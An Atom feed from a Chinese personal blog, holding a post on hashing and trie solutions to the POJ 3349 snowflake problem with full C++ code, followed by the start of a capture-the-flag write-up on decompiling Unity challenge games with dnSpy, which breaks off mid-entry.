<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Slient2009</title>
  
  <subtitle>All I need is Twin Island Milk</subtitle>
  <link href="http://slient2009.github.io/atom.xml" rel="self"/>
  
  <link href="http://slient2009.github.io/"/>
  <updated>2022-12-17T08:20:59.000Z</updated>
  <id>http://slient2009.github.io/</id>
  
  <author>
    <name>slient2009</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>POJ3349</title>
    <link href="http://slient2009.github.io/2022/12/18/POJ-3349/"/>
    <id>http://slient2009.github.io/2022/12/18/POJ-3349/</id>
    <published>2022-12-18T05:00:06.000Z</published>
    <updated>2022-12-17T08:20:59.000Z</updated>
    
    <content type="html"><![CDATA[<p>关于哈希我有些神奇的想法</p><span id="more"></span><h2 id="题面"><a href="#题面" class="headerlink" title="题面"></a>题面</h2><p><a href="http://poj.org/problem?id=3349">POJ 3349 Snowflake Snow Snowflakes</a><br>一片雪花有六个臂，用六个整数来表示（0&lt;= Li &lt;= 1000000）。<br>定义两片雪花相同当且仅当雪花经过一系列旋转或翻折后可以重合。<br>输入N(1&lt;=N&lt;=100000)片雪花的信息，求这些雪花中是否有两片相同。</p><h2 id="常规哈希"><a href="#常规哈希" class="headerlink" title="常规哈希"></a>常规哈希</h2><p>考虑到各个臂长是地位相等的，所以类似进制哈希的想法可以放弃了。<br>可以考虑连加或连乘的哈希函数，使得各个臂长值对哈希值的贡献地位相等。<br>然后用哈希挂链的方法来解决冲突的问题。<br>相同的雪花一定会挂在同一条链上，如何确定两个哈希值相同的雪花相同?<br>事实上，将臂长数组视作一个环，取环的字典序最小的表示序列可唯一确定一种雪花。<br>如<br>4 5 6 1 2 3    -&gt;    1 2 3 4 5 6<br>5 3 1 6 7 2    -&gt;    1 3 5 2 7 6<br>这个方法难度不大。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">int</span> lengths[<span class="number">100010</span>][<span class="number">7</span>];</span><br><span class="line"><span class="keyword">int</span> orderMat[<span class="number">20</span>][<span class="number">10</span>];</span><br><span class="line"><span class="keyword">int</span> hashST[<span class="number">65537</span>];</span><br><span class="line"><span class="keyword">bool</span> ordered[<span class="number">100100</span>];</span><br><span class="line"><span class="keyword">int</span> orderArray[<span class="number">7</span>];</span><br><span class="line"><span class="keyword">int</span> tmp[<span class="number">7</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">orderLengths</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(tmp[i]&gt;orderArray[i]) <span class="keyword">return</span> ;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(tmp[i]&lt;orderArray[i]) <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++) orderArray[i]=tmp[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getOrder</span><span class="params">(<span class="keyword">int</span> x)</span><span class="comment">//更早的版本是生成环的12个序列在取最小的字典序序列</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> minn = <span class="number">0x7f7f7f7f</span>;</span><br><span class="line">    <span class="built_in">memset</span>(orderArray,<span class="number">0x7f7f7f7f</span>,<span class="keyword">sizeof</span>(orderArray));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++) minn=min(minn,lengths[x][i]);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(lengths[x][i]==minn)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> j=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span>(lengths[x][(i+<span class="number">5</span>)%<span class="number">6</span>]&gt;=lengths[x][(i+<span class="number">1</span>)%<span class="number">6</span>])<span class="comment">//谁都有为了剪枝不择手段的时候，可能还会多耗时233</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span>(j=<span class="number">0</span>;j+i&lt;<span class="number">6</span>;j++) tmp[j]=lengths[x][i+j];</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> jj=<span class="number">0</span>;jj&lt;i;jj++,j++) tmp[j]=lengths[x][jj];</span><br><span class="line">                orderLengths(x);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(lengths[x][(i+<span class="number">5</span>)%<span class="number">6</span>]&lt;=lengths[x][(i+<span class="number">1</span>)%<span class="number">6</span>])</span><br><span class="line">            &#123;</span><br><span class="line">                j=<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span>(j=<span class="number">0</span>;i-j&gt;=<span class="number">0</span>;j++) tmp[j]=lengths[x][i-j];</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> jj=<span class="number">5</span>;jj&gt;i;jj--,j++) tmp[j]=lengths[x][jj];</span><br><span class="line">                orderLengths(x);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++) lengths[x][i]=orderArray[i];</span><br><span class="line">    minn--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hashCalc</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> hashV=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++) hashV=(hashV+lengths[x][i])%<span class="number">65537</span>;</span><br><span class="line">    <span class="keyword">return</span> hashV;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">judge</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    getOrder(a);</span><br><span class="line">    getOrder(b);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(lengths[a][i]!=lengths[b][i]) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">query</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> pos=hashCalc(x);</span><br><span class="line">    <span class="keyword">if</span>(hashST[pos]==<span class="number">0</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        hashST[pos]=x;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> now=hashST[pos];</span><br><span class="line">        <span class="keyword">while</span>(!judge(now,x) &amp;&amp; lengths[now][<span class="number">6</span>]!=<span class="number">-1</span>) now=lengths[now][<span class="number">6</span>];</span><br><span class="line">        <span class="keyword">if</span>(judge(now,x)) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            lengths[now][<span class="number">6</span>]=x;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">bool</span> flag=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(hashST,<span class="number">0</span>,<span class="keyword">sizeof</span>(hashST));</span><br><span class="line">    <span class="built_in">memset</span>(ordered,<span class="number">0</span>,<span class="keyword">sizeof</span>(ordered));</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">6</span>;j++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;lengths[i][j]);</span><br><span class="line">        lengths[i][<span class="number">6</span>]=<span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(query(i)) </span><br><span class="line">        &#123;</span><br><span class="line">            flag=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!flag) <span class="built_in">printf</span>(<span class="string">&quot;No two snowflakes are alike.&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;Twin snowflakes found.&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="字典树哈希？"><a href="#字典树哈希？" class="headerlink" title="字典树哈希？"></a>字典树哈希？</h2><p>由雪花的唯一表达序列入手，如果把这个序列插入到字典树里，岂不是变成了字典树查询+插入的无脑操作？<br>连哈希都不用了耶！<br>然而这样做有两个问题</p><h3 id="1-字典树的节点数量比较大"><a href="#1-字典树的节点数量比较大" class="headerlink" title="1 字典树的节点数量比较大"></a>1 字典树的节点数量比较大</h3><p>插入到字典树之前，需要将表示序列变成字符数组，最长有48位，一共有10w片雪花，则最多有480w个节点。<br>每个节点还要维护一个bool表示一个记录，10个儿子指向’0’ ~ ‘9’字符，也就是10个int。<br>没算错的话是183M，当然生成的数据没这么变态，所以还没有报MLE。</p><h3 id="2-时间开销也不小"><a href="#2-时间开销也不小" class="headerlink" title="2 时间开销也不小"></a>2 时间开销也不小</h3><p>没有两片相同雪花的情况下会有10w次查询插入操作，最多执行480w次节点访问操作。<br>一开始还没注意计算唯一表示序列的时间复杂度，看起来没什么，改着改着出了问题。<br>计算函数没写好，所用的时间可能比查询插入的时间还要多，即使重写优化了计算函数，还是没有卡过。<br>而且个人认为问题大概就出现在这里。</p><h3 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析"></a>原因分析</h3><p>为什么用字典树哈希过不了？（原谅我自创名词）</p><h4 id="1-背离了哈希的初衷"><a href="#1-背离了哈希的初衷" class="headerlink" title="1 背离了哈希的初衷"></a>1 背离了哈希的初衷</h4><p>哈希函数在可以较短的时间内解决了数据索引的问题，同时还将表长控制在可以接受的范围内。<br>将时间复杂度转移到了解决哈希冲突的处理上来。<br>还要注意的是空间开销和哈希冲突概率总是成反比，有时候可以从这里入手来一波时间空间互换。<br>如果将字典树上的节点视作雪花的哈希值，<br>一个是6次加法，另一个是48层的树高，在树上节点的转移、新建节点的时间开销也不可忽略。<br>这样一来，查询或者新建一个节点大概需要上百个基本操作时间。<br>虽然字典树上没有冲突，但是计算函数耗时太多。<br>而且方法一的冲突大概不会太多，基本可以忽略。<br>那么字典树的方法完败了……</p><h4 id="2-获取唯一序列函数复杂"><a href="#2-获取唯一序列函数复杂" class="headerlink" title="2 获取唯一序列函数复杂"></a>2 获取唯一序列函数复杂</h4><p>这个函数我写过两个版本<br>一是生成环的12种表示序列，然后去选其中字典序最小的。<br>二是从环中值最小的位置向两边扩展的到序列，开一个tmp数组取字典序最小。<br>即使是第二个版本，得到一片雪花的唯一表示序列至少需要几十次的基本操作时间。<br>得到10w片的唯一表示序列又用去了几千万次基本操作时间。<br>加一加差不多就过亿了吧……</p><p>虽然没卡过，还是腆着脸贴一下代码，欢迎指正。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">int</span> lengths[<span class="number">100010</span>][<span class="number">6</span>];</span><br><span class="line"><span class="keyword">int</span> orderMat[<span class="number">20</span>][<span class="number">10</span>];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="keyword">bool</span> cnt;</span><br><span class="line">    <span class="keyword">int</span> kids[<span class="number">10</span>];</span><br><span class="line">&#125;Tire[<span class="number">4800100</span>];</span><br><span class="line"><span class="keyword">int</span> total=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> strNum[<span class="number">50</span>];</span><br><span class="line"><span class="keyword">int</span> lens=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> orderArray[<span class="number">7</span>];</span><br><span class="line"><span class="keyword">int</span> tmp[<span class="number">7</span>];</span><br><span class="line"><span class="keyword">int</span> hashST[<span class="number">65537</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">orderLengths</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(tmp[i]&gt;orderArray[i]) <span class="keyword">return</span> ;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(tmp[i]&lt;orderArray[i]) <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++) orderArray[i]=tmp[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getOrder</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> minn = <span class="number">0x7f7f7f7f</span>;</span><br><span class="line">    <span class="built_in">memset</span>(orderArray,<span class="number">0x7f7f7f7f</span>,<span class="keyword">sizeof</span>(orderArray));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++) minn=min(minn,lengths[x][i]);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(lengths[x][i]==minn)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> j=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span>(lengths[x][(i+<span class="number">5</span>)%<span class="number">6</span>]&gt;=lengths[x][(i+<span class="number">1</span>)%<span class="number">6</span>])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span>(j=<span class="number">0</span>;j+i&lt;<span class="number">6</span>;j++) tmp[j]=lengths[x][i+j];</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> jj=<span class="number">0</span>;jj&lt;i;jj++,j++) tmp[j]=lengths[x][jj];</span><br><span class="line">                orderLengths(x);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(lengths[x][(i+<span class="number">5</span>)%<span class="number">6</span>]&lt;=lengths[x][(i+<span class="number">1</span>)%<span class="number">6</span>])</span><br><span class="line">            &#123;</span><br><span class="line">                j=<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span>(j=<span class="number">0</span>;i-j&gt;=<span class="number">0</span>;j++) tmp[j]=lengths[x][i-j];</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> jj=<span class="number">5</span>;jj&gt;i;jj--,j++) tmp[j]=lengths[x][jj];</span><br><span class="line">                orderLengths(x);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++) lengths[x][i]=orderArray[i];</span><br><span class="line">    minn--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">query</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    lens=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> tmp=lengths[x][i];</span><br><span class="line">        <span class="keyword">while</span>(tmp)&#123;</span><br><span class="line">            strNum[lens++]=tmp%<span class="number">10</span>;</span><br><span class="line">            tmp/=<span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> now=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">bool</span> flag=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;lens;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(Tire[now].kids[strNum[i]]==<span class="number">0</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            Tire[now].kids[strNum[i]]=(++total);</span><br><span class="line">            Tire[total].cnt=<span class="number">0</span>;</span><br><span class="line">            now=total;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> now=Tire[now].kids[strNum[i]];</span><br><span class="line">    &#125;</span><br><span class="line">    flag=Tire[now].cnt;</span><br><span class="line">    Tire[now].cnt=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">6</span>;j++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;lengths[i][j]);</span><br><span class="line">        getOrder(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">6</span>;j++) <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,lengths[i][j]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(query(i))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Twin snowflakes found.&quot;</span>);</span><br><span class="line">            <span class="keyword">while</span>(<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No two snowflakes are alike.&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本文来得很草率，计算分析过程非常不严谨，源于笔者对程序运行过程不甚了解。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;关于哈希我有些神奇的想法&lt;/p&gt;</summary>
    
    
    
    
    <category term="算法" scheme="http://slient2009.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>很久之前的巅峰极客Unity逆向</title>
    <link href="http://slient2009.github.io/2022/12/18/CTF-Unity/"/>
    <id>http://slient2009.github.io/2022/12/18/CTF-Unity/</id>
    <published>2022-12-18T05:00:05.000Z</published>
    <updated>2022-12-17T08:14:23.000Z</updated>
    
    <content type="html"><![CDATA[<p>很久之前，巅峰极客的两个Unity游戏逆向题。</p><span id="more"></span><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/202212171609542.png" alt="1.png"></p><p>最近开始接触到Unity的逆向，一周之内遇见了三次。<br>难道说这是逆向出题的新方向？<br>不好说，只能拿起DnSpy来一梭子先，虽然第二个题烂尾了。</p><h2 id="DnSpy"><a href="#DnSpy" class="headerlink" title="DnSpy"></a>DnSpy</h2><p><a href="https://github.com/0xd4d/dnSpy">https://github.com/0xd4d/dnSpy</a></p><p>Unity的逆向用IDA或者OD可能不是很好使，只好召唤DnSpy了。<br>DnSpy界面清爽，支持.NET和Unity等程序无源码的反编译、调试和修改。<br>请在github上按照需求下载对应的版本。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/202212171609924.png" alt="2.png"></p><h2 id="Misc-签到"><a href="#Misc-签到" class="headerlink" title="Misc-签到"></a>Misc-签到</h2><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/202212171610090.png" alt="4.png"></p><p>听说三叶草等了几分钟就把flag等出来了，对这种操作不得不服气。<br>用dnSpy打开这个exe，可以看到程序的结构。<br>App1和App1.Properties分别对应主窗口和“关于”窗口。<br>flag在App1中显示，在WindowsFormsApp1下找找，可以看到<string>a变量就是flag。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/202212171610860.png" alt="6.png"></p><h2 id="Re-NinJaProject"><a href="#Re-NinJaProject" class="headerlink" title="Re-NinJaProject"></a>Re-NinJaProject</h2><h3 id="大意"><a href="#大意" class="headerlink" title="大意"></a>大意</h3><p>游戏中操作忍者去吃小球，程序会检验此时的状态sha1值是否满足条件。如果满足，flag是此状态的MD5值前10位。<br>游戏状态的定义比较复杂，它由</p><ul><li>固定的头部字符串</li><li>当前忍者吃到的红球list的异或值（吃到红球score++）</li><li>当前忍者吃到的蓝球list的异或值（吃到蓝球score–）</li><li>界面中月亮和云的坐标抑或值</li><li>当前忍者hp和score的异或值（被怪碰到hp–）<br>字符串组成。<br>如果这个字符串的sha1值正确，算出MD5就可以了。</li></ul><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/202212171610400.png" alt="7.png"></p><h3 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h3><p>比较麻烦的是如何确定游戏中小球、月亮和云的位置。<br>朋友说游戏已经被封装好了，不能查看设定的位置。<br>只好寄托于dnSpy的修改功能。</p><h3 id="定位代码"><a href="#定位代码" class="headerlink" title="定位代码"></a>定位代码</h3><p>载入Assembly-CSharp.dll(Unity是建立在dll上的)<br>查看人如其名的PalyerMove类，可以断定Update()负责实时刷新状态，C0t1Nu30RnOt()负责校验状态是否合法。<br>redlist保存吃到的红球，bluelist保存吃到的蓝球<br>hp，score保存对应的值</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/202212171610713.png" 